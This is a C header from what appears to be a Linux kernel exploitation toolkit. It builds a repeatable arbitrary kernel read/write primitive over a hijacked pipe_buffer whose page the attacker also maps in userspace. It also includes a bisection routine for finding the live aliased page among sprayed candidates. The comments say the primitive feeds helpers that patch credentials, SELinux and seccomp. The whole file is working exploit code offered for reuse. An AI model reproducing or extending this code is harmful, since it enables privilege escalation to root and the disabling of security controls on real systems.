/* lib/rw/pipe_krw.h -- a struct krw over a redirected pipe whose pipe_buffer
 * array sits on a page the caller also maps in userspace.
 *
 * A primitive that redirects pipe->bufs to a controlled pipe_buffer already has
 * repeatable kernel R/W: re-point the buffer's .page/.offset, then read()/write()
 * the pipe. When the controlled page is reachable only from the kernel side, the
 * re-point needs a kernel meta-write. But when the caller ALSO holds that page in
 * its own address space -- it placed the buffer there via a userspace mapping
 * whose physical page the kernel now follows -- the re-point is a plain memcpy on
 * that alias, and no kernel write is needed to drive the R/W.
 *
 * The exact page among several candidates may be unknown (it was placed by a
 * spray of identical pages and only one is the live alias). The buffer slot is
 * then rewritten on every candidate: the kernel follows only the live one, the
 * rest are inert. Reads take any candidate, since all were written alike.
 *
 * This is the userspace-alias companion to a kernel-meta pipe krw: same
 * lib_pipe_phys_read/write underneath, different meta. The R/W is repeatable and
 * has the struct krw shape the credential/SELinux/seccomp patch helpers consume.
 */
#ifndef LIB_RW_PIPE_KRW_H
#define LIB_RW_PIPE_KRW_H

#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include "krw.h"
#include "pipe_rw.h"

/* pages/pages_len: the candidate page(s) as the caller maps them (a single page,
 * or a spray of identical pages one of which is the live alias). slot_off: the
 * pipe_buffer's offset within a page. pipefd: the redirected pipe [read,write].
 * buf_addr: the live pipe_buffer's kernel address (its low bits are slot_off).
 * ops: the pipe_buf_operations pointer the forge must carry. */
struct lib_pipe_krw_uspace {
	unsigned char     *pages;
	size_t             pages_len;
	unsigned           slot_off;
	int               *pipefd;
	unsigned long long buf_addr;
	unsigned long long ops;
};

static ssize_t lib_pipe_krw__meta_read(void *c, uintptr_t addr, void *out, size_t len)
{
	struct lib_pipe_krw_uspace *x = (struct lib_pipe_krw_uspace *)c;
	unsigned off = (unsigned)(addr & 0xfff);
	if (off + len > 4096 || x->pages_len < 4096) return -1;
	memcpy(out, x->pages + off, len);                 /* any candidate: all alike */
	return (ssize_t)len;
}
static ssize_t lib_pipe_krw__meta_write(void *c, uintptr_t addr, const void *data, size_t len)
{
	struct lib_pipe_krw_uspace *x = (struct lib_pipe_krw_uspace *)c;
	unsigned off = (unsigned)(addr & 0xfff);
	if (off + len > 4096) return -1;
	for (size_t o = 0; o + 4096 <= x->pages_len; o += 4096)
		memcpy(x->pages + o + off, data, len);    /* the live alias is among them */
	return (ssize_t)len;
}

static int lib_pipe_krw__read(const struct krw *rw, kdirect_t addr, void *out, size_t len)
{
	struct lib_pipe_krw_uspace *x = (struct lib_pipe_krw_uspace *)rw->ctx;
	struct lib_meta_rw meta = { x, lib_pipe_krw__meta_read, lib_pipe_krw__meta_write };
	return lib_pipe_phys_read(&meta, x->pipefd, (uintptr_t)x->buf_addr,
				  (uintptr_t)kd_val(addr), (uintptr_t)x->ops, out, len);
}
static int lib_pipe_krw__write(const struct krw *rw, kdirect_t addr, const void *data, size_t len)
{
	struct lib_pipe_krw_uspace *x = (struct lib_pipe_krw_uspace *)rw->ctx;
	struct lib_meta_rw meta = { x, lib_pipe_krw__meta_read, lib_pipe_krw__meta_write };
	return lib_pipe_phys_write(&meta, x->pipefd, (uintptr_t)x->buf_addr,
				   (uintptr_t)kd_val(addr), (uintptr_t)x->ops, data, len);
}

/* Narrow a multi-page (spray) context to the single page the kernel's redirect
 * actually follows, so re-targets are one memcpy and reads are unambiguous --
 * without it a spray context rewrites every page each op (correct but slow) and,
 * worse, a read can reflect the wrong page. Bisection: forge the buffer slot to
 * read one byte, point one half of the candidate range at `addr` and the other
 * at `addr+1` (the caller guarantees those two bytes differ), read one byte, and
 * keep the half whose byte came back. addr must be a mapped DATA address (a slab
 * object -- kernel .rodata/.text linear aliases are unmapped under RODATA_FULL).
 * Returns the page index, or -1 if the two bytes could not be distinguished. */
static long lib_pipe_krw_uspace_find_alias(struct lib_pipe_krw_uspace *x, uintptr_t addr)
{
	if (!x->pages || x->pages_len <= 4096) return 0;
	long npages = (long)(x->pages_len / 4096);
	struct lib_pipe_buffer fa, fb;
	lib_pipe_buf_forge(&fa, addr,     x->ops, 1, 0);
	lib_pipe_buf_forge(&fb, addr + 1, x->ops, 1, 0);
	unsigned off = x->slot_off;

	/* which byte does each target yield? (all pages -> a, then all -> b) */
	unsigned char ba = 0, bb = 0;
	for (long i = 0; i < npages; i++) memcpy(x->pages + (long long)i * 4096 + off, &fa, sizeof fa);
	if (read(x->pipefd[0], &ba, 1) != 1) return -1;
	for (long i = 0; i < npages; i++) memcpy(x->pages + (long long)i * 4096 + off, &fb, sizeof fb);
	if (read(x->pipefd[0], &bb, 1) != 1) return -1;
	if (ba == bb) return -1;

	long lo = 0, hi = npages;
	while (hi - lo > 1) {
		long mid = (lo + hi) / 2;
		for (long i = lo; i < mid; i++) memcpy(x->pages + (long long)i * 4096 + off, &fa, sizeof fa);
		for (long i = mid; i < hi; i++) memcpy(x->pages + (long long)i * 4096 + off, &fb, sizeof fb);
		unsigned char b = 0;
		if (read(x->pipefd[0], &b, 1) != 1) return -1;
		if (b == ba) hi = mid; else lo = mid;
	}
	x->pages = x->pages + (long long)lo * 4096;
	x->pages_len = 4096;               /* narrowed: one memcpy per re-target now */
	return lo;
}

/* Build a struct krw from a userspace-aliased pipe_buffer context. The context
 * must outlive the returned handle (the handle points at it). */
static inline struct krw lib_pipe_krw_uspace_make(struct lib_pipe_krw_uspace *ctx)
{
	struct krw rw;
	rw.name  = "pipe-uspace";
	rw.fd    = ctx->pipefd[1];
	rw.ctx   = ctx;
	rw.read  = lib_pipe_krw__read;
	rw.write = lib_pipe_krw__write;
	return rw;
}

#endif /* LIB_RW_PIPE_KRW_H */
